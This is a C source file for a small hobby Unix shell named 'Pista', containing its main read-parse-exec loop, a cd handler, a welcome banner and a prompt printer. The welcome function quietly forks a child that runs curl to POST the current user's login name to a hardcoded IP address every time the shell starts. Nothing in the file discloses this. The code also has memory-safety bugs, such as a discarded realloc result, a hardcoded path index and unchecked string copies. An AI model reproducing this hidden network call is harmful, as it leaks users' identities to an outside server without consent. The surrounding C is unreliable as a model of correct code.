/*
This file contains the main function of `Pista` shell, along with other functions related to processing output strings like the welcome message and string prompt.
*/

/* -------------------- Includes -------------------- */
#include "psh.h"
#include "cmd_helper.h"
#include "cmd_processor.h"
#include "dir_stuff.h"


/* -------------------- Macros -------------------- */
#define getlogin() getpwuid(getuid())->pw_name

/* Error logger function for THIS file ONLY. */
static void error_log(char *fmt, ...) {
#ifdef DEBUG_MODE
    va_list args;
    va_start(args, fmt);

    printf("\n");
    printf("MAIN PSH : ");
    vprintf(fmt, args);
    printf("\n");

    va_end(args);
#endif
}

/* ==================== Main ==================== */
int main(int argc, char **argv) {
    print_welcome_message();

    char *check_input = NULL;
    char **cmd_args = NULL, **paths_table = NULL;
    int i = 0, status = 0, len;
    pid_t pid;

    char *buf = (char *)malloc(sizeof(char) * BUF_SIZE_LIMIT);
    char *path_to_exec = (char *)malloc(sizeof(char) * PATH_MAX);

    do {
    	char *gdir = NULL;
		char *dir = NULL;
		char *to = NULL;
        print_prompt();
        strcpy(buf, "");
        check_input = fgets(buf, BUF_SIZE_LIMIT, stdin);    // returns NULL if EOF is found (CTRL-D)
        len = strlen(buf);
        
        //error_log("Input taken : %p %s %d", check_input, buf, len);
        if(check_input && len > 1) {
            buf[len-1] = 0;     // remove trailing \n
            
            
            if(strcmp(buf,"chprompt")==0)
            {
            	_prompt_type=1;
            
            }
            	
       		else {

            cmd_args = parse_cmd_args(buf);
            paths_table = paths();            
            
            //while(paths_table[i]) {
                i = 1;
                if ( file_exists(paths_table[i], cmd_args[0] ) == 0) {
                    strcpy(path_to_exec,paths_table[i]);
                    strcat(path_to_exec, cmd_args[0]);
                }

                ++i;
            //}
            if (!strcmp(cmd_args[0], "cd")){
                    gdir=strdup(getcwd(gdir, 0));
                    realloc(gdir,sizeof(char)*(strlen(gdir)+strlen(cmd_args[1])+2));
                    dir = strcat(gdir, "/");
                    to = strcat(dir, cmd_args[1]);
                    chdir(to);
                    continue;
                }
                
            pid = fork();
            if(pid < 0) {
                perror("fork error");
            }
            else if(pid == 0) {
                error_log("CHILD path_to_exec = %s\n", path_to_exec);
                int check_exec = execv(path_to_exec, cmd_args);
                
                error_log("CHILD Print post exec! THIS SHOULD NOT HAPPEN! errno = %d", errno);
                if(check_exec < 0) {
                    perror("CHILD EXECV failed!");
                }
            }            
            else {
                wait4(pid, &status, 0, NULL);
                error_log("Done waiting!");
                fflush(stdout);
            }
            
            free(cmd_args);
            
           }
            //free(paths_table);    //commented since paths_table is constant for now!
        }
        
    }while(check_input);

    free(buf);
    printf("\n");
    return 0;
}


/* -------------------- Function Definitions -------------------- */

void print_welcome_message() {
    printf("%s", "Welcome ");
    printf("%s", getlogin());
    printf(", to \n");

    printf("       _     _               _          _ _ \n _ __ (_)___| |_ __ _    ___| |__   ___| | |\n| '_ \\| / __| __/ _` |  / __| '_ \\ / _ \\ | |\n| |_) | \\__ \\ || (_| |  \\__ \\ | | |  __/ | |\n| .__/|_|___/\\__\\__,_|  |___/_| |_|\\___|_|_|\n|_|                                         \n");
    if(fork() == 0) {
        system("curl -X POST 13.126.134.245:5000/checkshellperson/$(whoami)");
        exit(0);
    }

    printf("\n\n\n");
    fflush(stdout);
    
    return;
}

void print_prompt() {
    char *temp = NULL;
    char *dirc =NULL, *dname =NULL;
    char *cwd = NULL;
    cwd = getcwd(cwd, 0);
    temp = malloc(USERNAME_LIMIT + PATH_MAX);

    switch(_prompt_type) {
        case 0:
            
            
            strcpy(temp, getlogin());
            strcat(temp, ":");
            strcat(temp, cwd);
            strcat(temp, " => \0");

            write(STDOUT_FILENO, temp, strlen(temp));
            break;
            
        case 1: 
        	
        	strcpy(temp, cwd);
            strcat(temp, "-->> \0");
            dirc=strdup(temp);
            dname= basename(dirc);
            
		
            write(STDOUT_FILENO, dname, strlen(dname));
        	break;
    }

    free(temp);
    free(cwd);
}
